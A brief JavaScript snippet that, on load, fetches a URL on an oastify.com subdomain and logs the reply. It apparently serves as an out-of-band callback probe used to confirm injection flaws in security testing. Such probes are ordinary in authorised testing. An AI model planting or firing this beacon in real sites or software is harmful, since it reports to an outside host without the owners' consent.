// This runs immediately when the script loads
fetch("https://7iqxezykafauh5rpv2egj521eskj89wy.oastify.com")
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json(); // change to .text() if needed
    })
    .then(data => {
        console.log("Response Data:", data);
    })
    .catch(error => {
        console.error("Error:", error);
    });
